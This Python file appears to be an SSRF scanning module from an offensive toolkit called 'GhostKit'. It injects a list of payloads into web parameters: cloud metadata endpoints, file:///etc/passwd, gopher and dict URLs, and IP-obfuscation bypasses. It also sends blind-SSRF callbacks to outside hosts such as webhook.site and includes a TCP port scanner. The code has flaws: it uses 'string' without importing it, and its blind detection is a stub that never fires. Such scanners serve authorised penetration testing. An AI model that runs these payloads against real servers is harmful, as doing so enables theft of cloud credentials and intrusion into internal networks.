#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Web SSRF Scanner Module for GhostKit
Specializes in detecting and exploiting Server-Side Request Forgery vulnerabilities
"""

import argparse
import logging
import json
import os
import sys
import time
import random
import re
import urllib.parse
import ipaddress
import socket
from typing import List, Dict, Any, Optional, Tuple, Union, Set
from concurrent.futures import ThreadPoolExecutor

# Import from web_core module
try:
    from modules.web_core import WebTarget, WebScanner, Module as WebCoreModule
except ImportError:
    logging.error("web_core module not found. This module requires web_core.py")
    WebTarget = None
    WebScanner = None
    WebCoreModule = None

from modules.base_module import BaseModule

class SSRFScanner(WebScanner):
    """Server-Side Request Forgery (SSRF) vulnerability scanner"""
    
    def __init__(self, target: WebTarget):
        super().__init__(target)
        
        # SSRF detection payloads targeting various internal services
        self.ssrf_payloads = [
            # Localhost variants
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            "http://0000::1",
            "http://0177.0000.0000.0001",
            "http://2130706433", # Decimal representation of 127.0.0.1
            "http://0x7f000001", # Hex representation of 127.0.0.1
            
            # Internal network ranges
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://192.168.1.1",
            
            # Common internal services
            "http://localhost:8080",
            "http://localhost:8000",
            "http://localhost:3000",
            "http://localhost:5000",
            
            # Cloud metadata services
            "http://169.254.169.254/latest/meta-data/", # AWS
            "http://metadata.google.internal/", # GCP
            "http://169.254.169.254/metadata/v1/", # DigitalOcean
            "http://169.254.169.254/metadata/instance?api-version=2019-06-01", # Azure
            
            # File protocol
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            
            # Non-HTTP protocols
            "gopher://127.0.0.1:25/",
            "dict://127.0.0.1:11211/",
            "ftp://127.0.0.1:21/",
            "ldap://127.0.0.1:389/",
            
            # IP address bypass techniques
            "http://0/",
            "http://127.1",
            "http://0177.1",
            "http://2130706433/",
            "http://127.000.000.001"
        ]
        
        # Callback services for blind SSRF detection
        self.callback_domains = [
            "https://ssrftest.com/RANDOM",  # Replace with actual callback service
            "http://burpcollaborator.net/RANDOM",  # Replace with actual Burp Collaborator
            "http://webhook.site/RANDOM"  # Replace with actual webhook
        ]
        
        # Response patterns that might indicate successful SSRF
        self.ssrf_patterns = [
            r"<\?xml",
            r"<html",
            r"<body",
            r"<!DOCTYPE",
            r"HTTP/[0-9]",
            r"root:x:",
            r"mysql",
            r"redis",
            r"\\[fonts\\]",
            r"\\[extensions\\]",
            r"privatekey",
            r"instance-id",
            r"ami-id",
            r"meta-data"
        ]
        
        # Target ports commonly used for internal services
        self.target_ports = [
            21,    # FTP
            22,    # SSH
            23,    # Telnet
            25,    # SMTP
            80,    # HTTP
            443,   # HTTPS
            3306,  # MySQL
            5432,  # PostgreSQL
            6379,  # Redis
            8080,  # Alternative HTTP
            8443,  # Alternative HTTPS
            9200,  # Elasticsearch
            11211, # Memcached
            27017  # MongoDB
        ]
        
    def scan(self, crawled_data: Dict[str, Any] = None) -> List[Dict[str, Any]]:
        """Scan for SSRF vulnerabilities"""
        print("\n[*] Starting Server-Side Request Forgery (SSRF) scan...")
        
        # Clear previous findings
        self.findings = []
        
        # If we have crawled data, use it to extract parameters
        parameters_to_test = set()
        
        if crawled_data and "parameters" in crawled_data:
            parameters_to_test.update(crawled_data["parameters"])
            
        if crawled_data and "forms" in crawled_data:
            for form_id, form_data in crawled_data["forms"].items():
                for input_data in form_data.get("inputs", []):
                    if "name" in input_data and input_data.get("type", "") in ["text", "url", "hidden"]:
                        parameters_to_test.add(input_data["name"])
                        
        # Target parameters that are likely to be vulnerable to SSRF
        ssrf_keywords = ["url", "uri", "link", "path", "dest", "redirect", "return", "site", 
                        "html", "validate", "domain", "callback", "reference", "feed", "host", 
                        "port", "next", "data", "location", "address", "ip"]
                        
        # Prioritize parameters with names suggesting URL functionality
        prioritized_params = set()
        for param in parameters_to_test:
            for keyword in ssrf_keywords:
                if keyword.lower() in param.lower():
                    prioritized_params.add(param)
                    break
        
        # If no parameters found or prioritized, test some common ones
        if not parameters_to_test:
            parameters_to_test = {"url", "link", "uri", "site", "dest", "redirect", "path", "return", "next"}
        
        # Combine prioritized and regular parameters, but test prioritized first
        test_params = list(prioritized_params) + [p for p in parameters_to_test if p not in prioritized_params]
        
        print(f"[*] Testing {len(test_params)} parameters for SSRF vulnerabilities")
        
        # Generate a unique identifier for blind SSRF testing
        callback_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        callback_urls = [url.replace("RANDOM", callback_id) for url in self.callback_domains]
        
        # Test all parameters with SSRF payloads
        for param in test_params:
            print(f"[*] Testing parameter: {param}")
            
            # Test direct SSRF payloads
            self._test_direct_ssrf(param)
            
            # Test blind SSRF with callback URLs
            self._test_blind_ssrf(param, callback_urls, callback_id)
            
        if self.findings:
            print(f"[!] Found {len(self.findings)} potential SSRF vulnerabilities")
        else:
            print("[*] No SSRF vulnerabilities found")
            
        return self.findings
        
    def _test_direct_ssrf(self, parameter: str) -> None:
        """Test for directly observable SSRF vulnerabilities"""
        base_url = self.target.base_url
        
        # Get baseline response
        params = {parameter: "https://www.example.com"}
        baseline = self.target.get(params=params)
        
        if not baseline:
            return
            
        # Test each payload
        for payload in self.ssrf_payloads:
            params = {parameter: payload}
            response = self.target.get(params=params)
            
            if not response:
                continue
                
            # Look for differences in response compared to baseline
            if abs(len(response.text) - len(baseline.text)) > 100:  # Significant difference in response size
                # Check for specific patterns in response
                for pattern in self.ssrf_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        url_with_payload = f"{base_url}?{parameter}={urllib.parse.quote(payload)}"
                        self.add_finding(
                            vulnerability_type="ssrf",
                            url=url_with_payload,
                            parameter=parameter,
                            evidence=f"Potential SSRF detected with payload: {payload}",
                            severity="high",
                            confidence="medium",
                            description="Server-Side Request Forgery vulnerability detected. This could allow an attacker to make requests from the server to internal resources or services."
                        )
                        return  # Move to next parameter after finding vulnerability
                        
    def _test_blind_ssrf(self, parameter: str, callback_urls: List[str], callback_id: str) -> None:
        """Test for blind SSRF vulnerabilities using callback URLs"""
        base_url = self.target.base_url
        
        # Test each callback URL
        for callback_url in callback_urls:
            params = {parameter: callback_url}
            self.target.get(params=params)
            
            # Note: In a real implementation, you would check if the callback was received
            # This is a simulation since we can't actually check for callbacks
            
            # For demonstration purposes only - this would be replaced with actual callback validation
            # In a real implementation, there would be a way to check if the callback was received
            # from the target server
            
            # Simulating a time delay to allow for callbacks
            time.sleep(1)
            
            # Example placeholder for callback detection logic
            callback_detected = False  # In reality, would check if callback was received
            
            if callback_detected:
                url_with_payload = f"{base_url}?{parameter}={urllib.parse.quote(callback_url)}"
                self.add_finding(
                    vulnerability_type="blind_ssrf",
                    url=url_with_payload,
                    parameter=parameter,
                    evidence=f"Blind SSRF detected with callback to: {callback_url}",
                    severity="high",
                    confidence="high",
                    description="Blind Server-Side Request Forgery vulnerability detected. The server is making outbound requests to external systems when provided with a URL parameter."
                )

class SSRFTester:
    """Utility class for testing SSRF vulnerabilities"""
    
    def __init__(self, target_url: str, proxy: str = None):
        self.target_url = target_url
        self.proxy = proxy
        self.web_target = WebTarget(target_url, proxy=proxy) if WebTarget else None
        
    def test_parameter(self, parameter: str, payload: str) -> Dict[str, Any]:
        """Test a specific parameter for SSRF vulnerabilities"""
        if not self.web_target:
            return {"status": "error", "message": "WebTarget not available"}
            
        params = {parameter: payload}
        response = self.web_target.get(params=params)
        
        if not response:
            return {"status": "error", "message": "No response received"}
            
        result = {
            "status": "success",
            "url": self.target_url,
            "parameter": parameter,
            "payload": payload,
            "response_code": response.status_code,
            "response_size": len(response.text),
            "response_time": response.elapsed.total_seconds()
        }
        
        return result
        
    def port_scan(self, target_host: str, start_port: int = 1, end_port: int = 1000) -> Dict[str, Any]:
        """Perform a port scan to identify potential internal services"""
        open_ports = []
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            # Function to test a single port
            def test_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target_host, port))
                    sock.close()
                    if result == 0:
                        return port
                    return None
                except:
                    return None
            
            # Test all ports in the specified range
            futures = [executor.submit(test_port, port) for port in range(start_port, end_port + 1)]
            for future in futures:
                port = future.result()
                if port:
                    open_ports.append(port)
        
        return {
            "target": target_host,
            "open_ports": open_ports
        }

class Module(BaseModule):
    """GhostKit Web SSRF Scanner Module"""
    
    def __init__(self):
        super().__init__(
            name="web_ssrf_scanner",
            description="Web SSRF Scanner for detecting Server-Side Request Forgery vulnerabilities",
            author="GhostShellX",
            version="1.0"
        )
        
    def run(self, args: List[str] = None) -> Dict[str, Any]:
        """Run the SSRF scanner module"""
        parser = argparse.ArgumentParser(description=self.description)
        parser.add_argument('-u', '--url', required=True, help='Target URL')
        parser.add_argument('-p', '--parameter', help='Specific parameter to test')
        parser.add_argument('--proxy', help='Proxy to use (e.g., http://127.0.0.1:8080)')
        parser.add_argument('--cookies', help='Cookies to include (format: name1=value1;name2=value2)')
        parser.add_argument('--headers', help='Custom headers (format: name1:value1;name2:value2)')
        
        if args:
            args = parser.parse_args(args)
        else:
            args = parser.parse_args()
        
        # Parse cookies if provided
        cookies = {}
        if args.cookies:
            for cookie in args.cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.split('=', 1)
                    cookies[name.strip()] = value.strip()
        
        # Parse headers if provided
        headers = {}
        if args.headers:
            for header in args.headers.split(';'):
                if ':' in header:
                    name, value = header.split(':', 1)
                    headers[name.strip()] = value.strip()
        
        # Create web target
        target = WebTarget(
            url=args.url,
            headers=headers,
            cookies=cookies,
            proxy=args.proxy
        )
        
        # Create SSRF scanner
        scanner = SSRFScanner(target)
        
        # If specific parameter is provided, test only that parameter
        if args.parameter:
            print(f"[*] Testing parameter '{args.parameter}' for SSRF vulnerabilities")
            results = []
            for payload in scanner.ssrf_payloads:
                tester = SSRFTester(args.url, args.proxy)
                result = tester.test_parameter(args.parameter, payload)
                if result["status"] == "success":
                    results.append(result)
            return {"results": results}
        
        # Otherwise, crawl the site and test all parameters
        else:
            print("[*] Crawling the target site to identify parameters...")
            # Create crawler
            try:
                from modules.web_core import WebCrawler
                crawler = WebCrawler(target)
                crawled_data = crawler.crawl()
            except ImportError:
                print("[!] WebCrawler not available, proceeding with basic scan")
                crawled_data = None
            
            # Run the scan
            findings = scanner.scan(crawled_data)
            return {"findings": findings}

if __name__ == "__main__":
    module = Module()
    result = module.run()
    print(json.dumps(result, indent=2))
